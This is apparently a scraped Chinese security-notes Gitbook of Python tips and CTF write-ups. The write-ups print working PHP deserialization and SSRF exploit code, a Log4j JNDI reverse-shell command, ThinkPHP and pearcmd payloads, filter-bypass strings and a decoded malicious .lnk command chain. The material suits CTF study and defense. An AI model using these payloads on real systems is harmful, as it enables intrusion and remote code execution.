worker(url): \"\"\"线程执行的函数\"\"\" with max_concurrent: try: response = requests.get(url, verify=False, timeout=3) except: pass if __name__ == \"__main__\": # 创建并启动线程 threads = [] with open('result.txt') as f: for url in f: url = url.replace(\"\\n\", \"\") thread = threading.Thread(target=worker, args=(url,)) thread.start() threads.append(thread) # 等待所有线程结束 for thread in threads: thread.join() 关闭ssl告警 import warnings from urllib3.exceptions import InsecureRequestWarning # 禁用警告 warnings.simplefilter('ignore', category=InsecureRequestWarning) 颜色变化 from colorama import init from colorama import Fore init(autoreset=True) print(Fore.GREEN + f\"[+]{url}存在漏洞！！！！\") JSON 加载与解码JSON数据： json.loads()函数可以将JSON字符串解析为Python对象。 json.load()函数可以从文件中读取JSON数据并解析为Python对象。 编码与保存JSON数据： json.dumps()函数可以将Python对象转换为JSON格式的字符串。 json.dump()函数可以将Python对象转换为JSON格式的字符串并写入文件。 操作与访问JSON数据： 解析后的JSON数据会被转换为相应的Python数据类型，如字典、列表等，可以像操作普通Python对象一样对其进行访问和操作。 处理特殊情况： json.JSONEncoder类可以自定义JSON编码器，以处理特殊数据类型或对象的编码。 json.JSONDecoder类可以自定义JSON解码器，以处理特殊的JSON数据格式或特定需求。 其他 url = urljoin(url, path) 问题 requests.exceptions.TooManyRedirects: Exceeded 30 redirects. allow_redirects=False 使用.format 字符串里原本就有{}时用其他的字符串格式化 f\"{xx}\" f\"%s\" % xx Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:13:13 "},"05.编程开发/Python/python命名空间.html":{"url":"05.编程开发/Python/python命名空间.html","title":"python命名空间","keywords":"","body":"From：https://www.bilibili.com/video/BV12F411t78n 开头说了一段话 lf you import another module, it will have its global scope 每个模块都有自己的全局空间 Each function has its local scope 每个函数都有自己的局部空间 Every time the function is called, a new scope is created 每当函数被调用时，就会创建一个空间给它使用 Certain Python objects like 'print' function, 'None','True', 'False', are available everywhere in your program and they are in the built-in scope python内置的函数在程序的任何一个空间都是可以使用的，它们存在于built-in空间中。 The variables or name bindings are stored in namespaces 变量和函数地址都存储在命名空间中 这是我根据视频的画的，左边的global空间是socket模块的，右边的global空间是我们程序的（我给它起了叫original） 所以我们的程序处在orginal里，所以想用socket模块中的方法就必须用.来访问 import socket #创建TCP/IP套接字 tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建UDP/IP套接字 udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 但是我们像下面这样写，就相当于把socket模块导入到我们的命名空间original中，就可以直接调用方法了 from socket import * #创建TCP/IP套接字 tcpSock = socket(AF_INET, SOCK_STREAM) #创建UDP/IP套接字 udpSock = socket(AF_INET, SOCK_DGRAM) 什么都没有的py def test(): a=10 print(locals())#查看test函数所在的local空间 print(globals())#查看global空间 print(\"\\n\") test() print(\"\\n\") print(dir(__builtins__))#查看built-in空间（就是python的内置函数和模块） #global {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': , '__spec__': None, '__annotations__': {}, '__builtins__': , '__file__': 'd:\\\\python3.8\\\\code\\\\1.py', '__cached__': None, 'test': } 因为在my_func中先使用了变量aprint(f\"iprefix} {a}\"),然后才在my_func中声明了变量a,所以报错。 在my_func中声明了global a,所以python知道local空间中的a指向global空间中的a。 所以在local中改变a的值，会影响global中的a。 原本在global空间中没有变量a,但是在local中声明了global a，python会自动在global中分配空间给变量a。 作者说it's bad code😄 globals()返回的是字典形式，可以通过键值索引的方式访问。 如何展示函数的local空间中保存的变量 函数的body中print(locals()) 通过函数的code方法下的属性访问 a=10 def test(): x=20 def test2(): global x x=10 test2() print(x) test() print(x) nonlocal用于寻找同为local空间的变量 nonlocal means, not in the current function's local scope and neither in the global scope nonlocal的寻找范围：上一级local空间到global空间的下一级 虽然global中声明了变量a，但是nonlocal还是找不到变量a 即使在local中声明了global a,nonlocal仍然找不到变量a 所以nonlocal的寻找范围：上一级local空间到global空间的下一级 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 11:41:34 "},"05.编程开发/Python/python技巧.html":{"url":"05.编程开发/Python/python技巧.html","title":"python技巧","keywords":"","body":"输出列表元素 lis=[1,2,3] print(lis[1:]) print(*lis[1:]) >> [2, 3] 2 3 同时获得元素与元素索引 lis = ['a','b','c'] for index,i in enumerate(lis): print(index,i) >> 0 a 1 b 2 c 字符串格式化 类似c语言 # %s 字符串占位 print(\"%s\"%'abcd') # %c 字符占位 print(\"%c\"%'a') format (会自动将变量转为str) print(\"{}{}\".format(1,2)) a=1 b=2 print(f'{a}{b}') >> 12 12 占位符格式化https://blog.csdn.net/u014770372/article/details/76021988 交换数值 a=1 b=2 a,b=b,a print(a,b) >>2 1 推导式 [想得到的变量形式 for 变量 in 可迭代对象 if 条件表达式] #找出列表里大于0的数 shu=[1,2,3,-1,-2,-3] print([i for i in shu if i>0]) >>[1,2,3] #统计一个字符串中每个字符出现的次数 m = 'I am Khazking!' n = {i:m.count(i) for i in m} print(n) >>{'I': 1, ' ': 2, 'a': 2, 'm': 1, 'K': 1, 'h': 1, 'z': 1, 'k': 1, 'i': 1, 'n': 1, 'g': 1, '!': 1} 字符串替换 #repalce方法只能实现元素一对一替换 #使用下述方法可以实现b替换为z,z替换为b #建立映射关系字典 a='zbbz' table = ''.maketrans('bz','zb')#等价于 table= {'b':'z','z':'b'} a = a.translate(table) print(a) >>bzzb 各种排序 reverse=True降序，默认为升序 字典排序 # 按键值排序 sorted(dic.items(),key=lambda item:item[1],reverse=True) # 按键名排序 sorted(dic.items(),key=lambda item:item[0],reverse=True) 嵌套排序 # 字典嵌套 {'a': [1, 3], 'c': [3, 4], 'b': [0, 2], 'd': [2, 1]} sorted(dic.items(), key=lambda x: x[1][1], reverse=True) # 按键值（列表）的第二个元素排列 # 列表嵌套 [['金牛', 89000, 13140.196950444726, 2800, 1574], ['锦江', 113800, 18719.342387419587, 2550, 1399], ['成华', 96400, 14034.861538461539, 2300, 1300], ['高新', 160000, 23663.31254871395, 3600, 1283], ['武侯', 102000, 19768.739789964995, 3100, 857]] sorted(lis, key = lambda k : k[2],reverse= True) # 按每个子列表的第三个元素排列 修改下标即可按照其他元素进行排列。 统计字符出现的频率 from random import randint from collections import Counter data = [randint(0,20) for i in range(30)] s = dict.fromkeys(data,0) print(s) for i in data: s[i]+=1 # 统计字符出现次数 print(s) #统计s中出现频率最高的三个数 print (Counter(s).most_common(3)) 从序列中筛选出符合条件的元素 from random import randint #filter(function, iterable) data = [randint(-10,10) for i in range(10)] data = list(filter(lambda x:x>=0,data)) print(data) #或者列表推导式 临时文件 我们采集数据进行分析，但是我们只需要保存结果，我们采集的数据如果常驻内存就会让电脑崩溃，于是我们将这个数据放在临时文件中（外部存储），在文件关闭后将被删除 from tempfile import TemporaryFile,NamedTemporaryFile f = TemporaryFile() f.write(b'abc'*10000) f.seek(0) a=f.read(100) print(a) 这个临时文件在系统中是找不到的，如果我们想创建一个能在文件系统中看到的临时文件，我们就用NamedTemporaryFile nte = NamedTemporaryFile(delete=false)#delete参数为false时程序运行完，临时文件也不会被删除 print(nte.name) 穷举组合 #全排列 from itertools import permutations #permutations()返回的是tuple类型，所要要用''.join(i)连接起来 for i in permutations('123',2): print(''.join(i),end=' ') 模拟终端 import pty;pty.spawn('/bin/bash') 二进制文件原地修改 import os import mmap def memory_map(filename, access=mmap.ACCESS_WRITE): size = os.path.getsize(filename) fd = os.open(filename, os.O_RDWR) return mmap.mmap(fd, size, access=access) m = memory_map('data') >>> len(m) 1000000 >>> m[0:10] b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' 脚本参数 python xx.py aa sys.argv[0]→xx.py sys.argv[1]→aa import argparse parser = argparse.ArgumentParser() parser.add_argument(\"-u\",\"--url\", type=str, help=\"target url\") parser.add_argument(\"-t\", \"--threads\" , type=int, help=\"threads num\") args = parser.parse_args() >> python xx.py -u xx.com -t 20 args.url=xx.com args.threads=20 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:13:21 "},"05.编程开发/工具原理/sqlmap.html":{"url":"05.编程开发/工具原理/sqlmap.html","title":"Sqlmap","keywords":"","body":" sqlmap 项目剖析1 sqlmap 项目剖析2 sqlmap 项目剖析3 sqlmap 使用一种极其巧妙的方式组合生成一个完整的 payload，一个完整的 payload 由如下几个部分组成： 其中 prefix、comment、suffix 作为 boundary，boundary 用于闭合注入点的前后部分；test 则是最终如果闭合成功后必然执行的语句。 因此 sqlmap 将 prefix 与 suffix 单独作为 boundaries 保存，而 test 和 comment 则根据注入方式和数据库的不同被划分为六个文件（路径：/data/xml/payloads） sqlmap 项目剖析4 布尔注入 先发送一个 false 请求，如果结果与原页面相同就判断不存在布尔注入 如果不相同发送一个 true 请求,如果与原页面相似 则再发送一个 false 请求，然后把这两次返回的结果取差集，计算出True时的flag标识，也就是sqlmap的-string参数 报错注入 发送报错payload，如果能够正则匹配到则说明存在报错注入。 延时注入 先发送N个正常请求，然后计算这N个请求响应时间的标准差和正常请求的最长响应时间 然后发送一个延时请求，判断是否在区间内 联合查询注入 用order by和二分法来判断列数 遍历列数判断哪一列是回显点 发送payload sqlmap源码分析与学习 sqlmap 流程脑图 os-shell 原理 sqlmap --os-shell原理 Sqlmap之os-shell原理分析 攻防 实战sqlmap绕过WAF sqlmap --os-shell反制小思路 入侵检测之sqlmap恶意流量分析 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 23:21:05 "},"05.编程开发/Nginx.html":{"url":"05.编程开发/Nginx.html","title":"Nginx","keywords":"","body":"http { # 负载均衡，weight轮询的权重 upstream backend { least_conn; server backend1.example.com weight=3 max_fails=3 fail_timeout=30s; server backend2.example.com weight=2 max_fails=3 fail_timeout=30s; server backend3.example.com weight=1 max_fails=3 fail_timeout=30s; } # 转发到内网其他服务器 server { listen 80; server name 域名; location / { proxy_pass http://backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; deny 127.0.0.1; #拒绝的ip allow 172.18.5.54; #允许的ip } } server { listen 80; server_name demo.域名.com; location / { charset utf-8; root /electronic-book-demo/build/; index index.html index.htm; } } } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 16:46:41 "},"06.WriteUp/CTF/2022安洵杯.html":{"url":"06.WriteUp/CTF/2022安洵杯.html","title":"2022 安洵杯","keywords":"","body":"web babyphp 知识点 与buu--bestphp‘s revenge差不多 session+反序列化 原生类SSRF+文件操作 思路 第一步，设置php的session解析器，使得下一次会话时session中保存的是构造好的SoapClient对象。 SoapClient对象 $target, 'user_agent'=>'khaz^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string, 'uri'=>'hello')); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); echo \"|\".urlencode($aaa); 第二步，反序列化触发SoapClient的call方法，从而导致SSRF，从而将flag保存到SSRF请求对应的session中。 pop： B::destruct → C::toString → A::invoke → C::uwant a = \"babyhacker\"; } public function __invoke() { echo \"触发invoke\\n\"; echo $a.\"\\n\"; if (isset($this->a) && $this->a == md5($this->a)) { $this->b->uwant(); } } } class B { public $a; public $b; public $k; function __destruct() { echo \"触发destruct\\n\"; $this->b = $this->k; die($this->a); } } class C { public $a='getflag'; public $c; public function __toString() { echo \"触发toString\\n\"; $cc = $this->c; return $cc(); } public function uwant() { echo \"触发uwant\\n\"; if ($this->a == \"phpinfo\") { phpinfo(); } else { call_user_func(array(reset($_SESSION), $this->a)); } } } $a = new A(); $b = new B(); $c = new C(); $c2 =new C(); $b->a = $c; $c->c = $a; $a->a = \"0e215962017\"; $a->b = $c2; $result = serialize($b); // echo $result; $x=str_replace('O:1:\"A\":2:', 'O:1:\"A\":3:',$result);//绕过__wakeup() echo urlencode($x); 这里的500是因为C::tostring()的报错，而不是反序列化出错。 第三步，修改cookie中的PHPSESSIONID为SSRF请求的PHPSESSIONID，读取到flag。 查看flag文件名的结果 easy_upload--复现 dirsearch扫描没有发现其他页面。 只有一个文件上传功能点 先上传一句话木马，发现有过滤 尝试图片+.htaceess 发现只接受.php文件，那么就是要绕过文件内容过滤。 经测试发现 $ ` * 还有很多函数被过滤 以下可以 在phpinfo中可以发现disable_function禁用了几乎所有的函数。 但是没有禁用file_get_contents这个读取文件的函数。所以只要能找到flag的路径就可以了。 网上的师傅做法是利用原生类来找到路径，利用php字符串解析来绕过字符过滤。 payload 查找路径 # \\147\\154\\157\\142\\72\\57\\57\\57\\146\\52 → glob:///f* 读取flag # \\146\\151\\154\\145\\137\\147\\145\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163 → file_get_contents misc flybenben--复现 CE修改 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:15:03 "},"06.WriteUp/CTF/bugku应急响应.html":{"url":"06.WriteUp/CTF/bugku应急响应.html","title":"bugku 应急响应","keywords":"","body":"js劫持 cat `find /var/www/html -name \"6127418cad73c.php\"` find . | xargs grep -ri '' -l | sort | uniq -c 通过xss的特征内容来定位可疑文件 反弹shell后门 处理： 删除文件 杀掉进程 命令劫持 数据库修复 MySQL之权限管理 - I’m Me! - 博客园 revoke file on *.* from 'root'@'localhost'; # 收回文件权限 set global general_log = off; # 不启用日志 flush privileges; # 刷新权限 用户删除 直接删就完事了 首次攻击 筛选了ip和状态码，然后找的。 发现安装了phpmyadmin，那么很大概率是通过数据库攻入的。 登录phpmyadmin后台查看二进制日志，很明显看出来这个是使用udf创建恶意函数sys_eval提权 # 查看这些目录是否有文件，很可能有提权 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ 修复 在my.ini中添加如上设置，不允许导入和导出。 进行mysql日志分析，通过定位sys_eval来查找攻击者进行了哪些操作 只进行了添加用户的操作 直接删除该用户 查杀websehll 使用日志分析工具 （跟踪ip的访问） 后门查杀 木马位置在启动项 通过资源监视器得到该木马外联地址 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:08:54 "},"06.WriteUp/CTF/HNCTF.html":{"url":"06.WriteUp/CTF/HNCTF.html","title":"HNCTF 2022","keywords":"","body":"web [HNCTF 2022 WEEK3]Fun_php $getUserID = @$_GET['user']; $getpass = (int)@$_GET['pass']; $getmySaid = @$_GET['mySaid']; $getmyHeart = @$_GET['myHeart']; $data = @$_POST['data']; $verify =@$_POST['verify']; $want = @$_POST['want']; $final = @$_POST['final']; if(is_string($getUserID)) $user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r if($user == 114514 && $getpass == $pass){ if (!ctype_alpha($getmySaid)) die(); if (!is_numeric($getmyHeart)) die(); if(md5($getmySaid) != md5($getmyHeart)){ die(\"Cheater!\"); } else $week_1 = true; } 字符串与数字弱比较 u5er_D0_n0t_b3g1n_with_4_numb3r 'sdasd114514' == 114514 get --> user=114514 猜测$pass为字符串 'dbasdha' == 0 //True get --> pass=0 字符串与数字MD5相等 科学计数法绕过 0e开头的数字字符串 s214587387a 1586264293 if(is_array($data)){ for($i=0;$i array_search默认弱比较查找,返回查找成功元素的下标 post --> data[]=0 if($week_1 && $week_2){ if(md5($data)===md5($verify)) // ‮⁦HNCTF⁩⁦Welcome to if (\"hn\" == $_GET['hn'] &‮⁦+!!⁩⁦& \"‮⁦ Flag!⁩⁦ctf\" == $_GET[‮⁦LAG⁩⁦ctf]) { //HN! flag!! F if(preg_match(\"/php|\\fl4g|\\\\$|'|\\\"/i\",$want)Or is_file($want)) die(\"HACK!\"); else{ echo \"Fine!you win\"; system(\"cat ./$want\"); } } else die(\"HACK!\"); } md5弱比较，数组绕过 post --> data[]=0&verify[]=1 零宽度隐写，？？？？ get --> hn=hn&%E2%80%AE%E2%81%A6LAG%E2%81%A9%E2%81%A6ctf=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6ctf if(preg_match(\"/php|\\fl4g|\\\\$|'|\\\"/i\",$want)Or is_file($want)) 通配符绕过 post --> want=f* [HNCTF 2022 WEEK3]logjjjjlogjjjj 复现：https://blog.csdn.net/weixin_47179815/article/details/125654828 本地环境：JDK版本1.8 攻击流程 服务器运行攻击脚本生成payload java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,base64(反弹shell)}|{base64,-d}|{bash,-i}\" -A 服务器ip 服务器监听端口 发送payload ${jndi:xxx://xxxx/xxx} 将上面生成的payload放入（优先JDK） URL编码后发送请求 成功连接 misc 简单编码 图片尾部有一串url编码后的字符 [HNCTF 2022 Week1]线下单杀出题人（OSINT) 首先从A图片中提取出经纬度 因为这个经纬度是度分秒的形式，需要先转换为度数形式 格式转换：http://www.gzhatu.com/du2dfm.html 定位：http://www.gzhatu.com/dingwei.html A图片中还有一个提示 所以可以确定定位是正确的。 然后根据第二张图中的河流可以知道是往哪条路走的。 用高德地图定位嘉兴电信大厦，往那条路找，找到 flag from hashlib import md5 print(md5('嘉兴市南湖区禾兴北路506号亚芬汀精品酒店'.encode('utf-8')).hexdigest())#utf-8编码 SSCTF{f833a4d17d35ca5da40f087950293d04} 也可以用exif工具查看 [HNCTF 2022 Week1]三生三世 弱密码爆破，图片base64隐写得到二维码，扫描后用栅栏密码解密，每组字数为3. [HNCTF 2022 Week1]silly_zip 伪加密+IHDR修改 [HNCTF 2022 Week1]piz.galf 两次逆序 f = open(r\"C:\\Users\\khaz\\Downloads\\pmb.galf\" , 'rb' ).read() f2 = open(r\"C:\\Users\\khaz\\Downloads\\flag.bmp\" , \"wb\") f2.write(f[ ::-1]) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:47:14 "},"06.WriteUp/CTF/misc.html":{"url":"06.WriteUp/CTF/misc.html","title":"MISC","keywords":"","body":"wiki：https://cuccs.github.io/ctf-wiki/MISC/MISC-2/MISC-2/ 编码：https://cloud.tencent.com/developer/article/1749430 奇奇怪怪解密：https://www.dcode.fr/ brain_fuck:https://www.splitbrain.org/services/ook misc高手博客：http://www.ga1axy.top/index.php/archives/6 https://zhouhaobusy.com/ jphide：【隐写工具】【试一试？】jphide seek（JPHS） 使用方法,检测提示，附下载地址_黑色地带(崛起)的博客-CSDN博客_jphs使用 usb流量分析：USB流量分析 拼图教程：https://blog.csdn.net/qq_51999772/article/details/122425898 还原拼图gaps安装：https://blog.csdn.net/ZT7524/article/details/119981204 gaps的size参数=属性中的像素值/碎片个数 二维码https://mp.weixin.qq.com/s/1C98fhfoP81onob6a_v6Ag 二维码扫描工具：QRCODE，手机app CortexScan 二维码/条形码在线：https://online-barcode-reader.inliteresearch.com/ 摩斯电码：http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx flag base64 编码后 ZmxhZw 图片详细信息 直接在010内搜索flag linux命令 file binwalk foremost strings grep -a strings filename exiftool 常见文件格式 https://www.cnblogs.com/lwy-kitty/p/3928317.html 文件格式 文件头 文件尾 JPG FF D8 FF D9 PNG 89 50 4E 47 AE 42 60 82 GIF 47 49 46 38（Gif89a） 00 3B ZIP 50 4B 03 04（PK） 50 4B RAR 52 61 72 21（Rar!） 7z 37 7A BC AF 27 1C PDF %PDF- 加上版本号如%PDF-1.4 检查后缀名、文件头是否正确 破环文件头，一定不能显示，破环文件尾，文件不一定显示不正常 比如说我可以在图片的文件尾加一个压缩包，图片仍能够正常显示。 png IHDR 脚本爆破，010修改 LSB/MSB通道隐写 使用zsteg（kali）来分析 #分析每个通道 zsteg file_name #提取通道 zeteg -e '通道' 源文件 > 输出文件 反相，red plane等用stegsolve jpg Stegdetect：探秘加密方式 jphide outguess 解密 outguess -k 密码 -r 文件名 输出文件 加密 outguess -k 密码 -d 要隐藏的文件 源图片 输出图片 F5隐写 java Extract 图片的绝对路径 -p 密码 -e 输出文件 通用图片隐写 silenteye 可以将文字或者文件隐藏到图片的解密工具 gif 帧--wps图片 zip 伪加密 修改文件内容如下： 50 4B 03 04：头文件标记 其后的第二个字节为00 00 50 4B 01 02：目录中文件文件头标记 （压缩包里有几个文件就有几个这个标志） 其后的第三个字节为09 00（只要09部分为奇数即可） 备注 crc爆破 CRC是用文件保存的内容作为明文加密的，所以可以根据CRC的不同判断出文件内容是否相同，也可以进行逆向破解得到文件内容。 适用于文件大小不大的 py crc32.py reverse 文件crc值（十六进制） 已知明文攻击 有一个单独的文件已知且进行压缩之后的CRC值与某个包含此文件的压缩包的CRC值相等。 520迎新赛 Pngenius binwalk命令得到zip压缩包，不是伪加密，也不是弱密码，用stegsolve打开在rgb通道末位发现 或者用zsteg更方便 解压得到flag EasyEncode 压缩包弱密钥爆破，得到16进制,转换得到unicode编码，再转换得到base64编码，解码得到flag import base64 def hex_to_bin(a): b='' for i in range(0,len(a),2): b+=chr(int(a[i:i+2],16)) return b a='5c75303035325c75303034375c75303035365c75303037615c75303036345c75303034345c75303034325c75303036655c75303034645c75303033335c75303037345c75303034355c75303035615c75303035375c75303033395c75303036625c75303036315c75303035375c75303033355c75303036655c75303035385c75303037615c75303034365c75303037615c75303035385c75303033325c75303035355c75303033305c75303036335c75303033335c75303036635c75303036365c75303034655c75303034365c75303033395c75303035365c75303036365c75303035315c75303032355c75303033335c75303034345c75303032355c75303033335c7530303434' b=hex_to_bin(a) b=b.replace('\\\\u00','') b=hex_to_bin(b).replace('%3D','=') print(b) print(base64.b64decode(b)) 你知道js吗 看到pk开头以为是zip，解压后得到XML，用file命令查看类型得知是word文档 修改后缀名为.doc，打开 更改字体或者复制出去会发现其实是base664编码 StrangeTraffic 不理解 wp写的是 追踪tcp流，寄存器在变化？观察发现base64编码后的Dest。。 不过提供了一个思路就是可以观察字母是否是flag的base64编码 4096 https://blog.csdn.net/weixin_46081055/article/details/125046554 到了音频那就不会了 注意的点： gaps拼图的命令 gaps --image=part_flag.jpg --size=64 --save size 图片大小：960x1024 像素 得到的碎片图：15x16个碎片 size=960/15 Python_jail 空白字符隐写 lsb通道隐写 得到py文件 运行py文件得到flag 2021安洵杯 love math 打开附件看到flag压缩包和几个txt文件 crc爆破得到解压密码 解压得到一张图片，lsb隐写，提取后得到一张图片，只是破坏了文件头，修复之后 根据提示画出自己找到解密网站Tupper's Self-Referential Formula Playground CyzCC_loves_LOL lol解密得到解压密码 解压后得到两张图片 一张brainfuck加密 另一张silent eye加密 解密brainfuck图片Brainloller得到密码 解密silent eye得到flag Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-11-11 16:24:38 "},"06.WriteUp/CTF/NewstarCTF.html":{"url":"06.WriteUp/CTF/NewstarCTF.html","title":"New Star CTF","keywords":"","body":"misc week5 最后的流量分析 先按照数据包大小排列，看了几个包发现是sql布尔盲注（上周的sql我用的就是布尔盲注）。 上图为正确回显 进行过滤 一个一个找就行了 奇怪的PDF 2 下载下来是一个快捷方式，打开是《欺骗的艺术》这本书。😱 它是快捷方式，很自然就去看它指向了哪个文件 %SystemRoot%\\system32\\cmd.exe /c copy \"strange2.pdf.lnk\" %tmp%\\\\g5ZokyumBB2gDn.tmp /y for /r C:\\\\Windows\\\\System32\\\\ %i in (*ertu*.exe) do copy %i %tmp%\\\\msoia.exe /y findstr.exe\"TVNDRgAAAA\"%tmp%\\\\g5ZokyumBB2gDn.tmp>%tmp%\\\\cSi1r0uywDNvDu.tmp&%tmp%\\\\msoia.ex 然后搜索msoia.exe就得到了类似的题 https://www.anquanke.com/post/id/267031 https://www.cnblogs.com/hed10ne/p/15841253.html 目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符 读取完整命令 import sys import win32com.client # pip install pywin32 shell = win32com.client.Dispatch(\"WScript.Shell\") shortcut = shell.CreateShortCut(\"20200308-sitrep-48-covid-19.pdf.lnk\") print(shortcut.Targetpath) print(shortcut.Arguments) PS D:\\python3.8\\code> python -u \"d:\\python3.8\\code\\0.py\" C:\\Windows\\System32\\cmd.exe /c copy \"strange2.pdf.lnk\" %tmp%\\\\g5ZokyumBB2gDn.tmp /y&for /r C:\\\\Windows\\\\System32\\\\ %i in (*ertu*.exe) do copy %i %tmp%\\\\msoia.exe /y&findstr.exe \"TVNDRgAAAA\" %tmp%\\\\g5ZokyumBB2gDn.tmp>%tmp%\\\\cSi1r0uywDNvDu.tmp&%tmp%\\\\msoia.exe -decode %tmp%\\\\cSi1r0uywDNvDu.tmp %tmp%\\\\oGhPGUDC03tURV.tmp&expand %tmp%\\\\oGhPGUDC03tURV.tmp -F:* %tmp% &wscript %tmp%\\\\9sOXN6Ltf0afe7.js oGhPGUDC03tURV.tmp的文件头是MSCF，是微软的.cab压缩文件格式 使用命令expand %tmp%\\\\oGhPGUDC03tURV.tmp -F:* 解压路径得到 flag在flag.txt中 js脚本 var e7926b8de13327f8e703624e = new ActiveXObject(\"WScript.Shell\");e7926b8de13327f8e703624e.Run (\"cmd /c mkdir %tmp%\\\\flag&&move /Y %tmp%\\\\cSi1r0uywDNvDu.tmp %tmp%\\\\flag\\\\flag.txt&\\\"%tmp%\\\\strange2.pdf\\\"\",0); Yesec no drumsticks 5 git工作原理 workspace：工作区--本地目录（比如我git init Test创建了一个空仓库，那么Test这个目录就是workspace） staging area：暂存区/缓存区--.git目录下的index文件（git add 或者git stash） local repository：版本库或本地仓库--.git目录下的objects目录 remote repository：远程仓库--github 以本题为例，其.git目录如下 解题 index中有flag.txt文件 恢复缓存工作区git stash pop 回滚git reset --hard commit_id后，读取flag.txt得到flag{Yesec#1s#c@ibi} 总结 源码泄露 git回滚 查看历史版本 git log 回滚到历史版本 git reset --hard commit_id 实际上就是将HEAD指向commit_id git缓存 将当前工作区缓存 git stash 恢复缓存 git stash pop 回滚到缓存版本 git reset --hard commit_id web week2 ezapi graphql 漏洞：https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ 使用语法：https://blog.csdn.net/weixin_39130261/article/details/118547853 week3 IncludeTwo 本地文件包含（LFI）绕过后缀名添加，使用pearcmd.php绕过。 p神的文章：https://tttang.com/archive/1312/#toc_0x06-pearcmdphp pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。(类似于python中的pip)在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php pear中有一个命令config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 payload ?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/+/tmp/hello.php 然后一句话木马就会被写入/tmp/hello.php中，我们只需包含这个文件即可。 Maybe You Have To think More 5.1.41LTS ThinkPHP框架反序列化漏洞https://www.freebuf.com/vuls/269882.html 这道题反序列化点在cookie中 payload cookie: TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami ?dajs=ls flag在环境变量里。 week4 So Baby RCE |`|\\/| |\\\\\\\\|\\*/i',$_GET[\"cmd\"])){ echo \"Don't Hack Me\"; }else{ system($_GET[\"cmd\"]); } }else{ show_source(__FILE__); } 过滤了很多。主要是 关键词绕过 通配符，插入空字符绕过等等 ；绕过 %0a或者&&绕过 /绕过 ls / == cd 路径；ls 返回上级目录 cd .. 空格绕过 ${IFS}等等 payload ?cmd=cd${IFS}..%0acd${IFS}..%0acd${IFS}..%0aca$1t${IFS}ffff$1llllaaaaggggg BabySSTI_Two unicode编码绕过，catch_warnings被过滤，换一个类比如os._wrap_close就好了。 UnserializeThree 考点：phar反序列化，#绕过 文件上传给出上传后文件路径 注释中提示class.php |cmd)){ //Same point ,can you bypass me again? eval(\"#\".$this->cmd); }else{ echo \"No!\"; } } } file_exists($_GET['file']); 绕过 闭合php标签 \\n \\r 这里只能用\\r。 payload cmd = \"\\rsystem('cat /flag');\"; } public function __destruct() { if(!preg_match(\"/>|cmd)){ //Same point ,can you bypass me again? eval(\"#\".$this->cmd); echo \"#\".$this->cmd; }else{ echo \"No!\".$this->cmd; } } } $phar = new Phar(\"test.phar\");//生成的压缩文件名为test.phar $phar->startBuffering(); //设置stub $phar->setStub(\"\"); //将自定义的meta-data存入manifest $a = new Evil(); $phar->setMetadata($a); //添加要压缩的文件 $phar->addFromString(\"test.txt\", \"test\"); //签名自动计算 $phar->stopBuffering(); ?> 将生成的phar改图片后缀名上传后，在class.php下用phar协议访问（只要是phar文件，后缀名是什么都可以解析） /class.php?file=phar://file_path 又一个SQL 0^0和0^1，回显两种情况，猜测使用盲注。 payload import requests import time from urllib import parse #数字 #0^(ascii(substr((select(database())),{},1))>{}) #单引号 #0' or (ascii(substr((select(database())),{},1))>{}) or '0 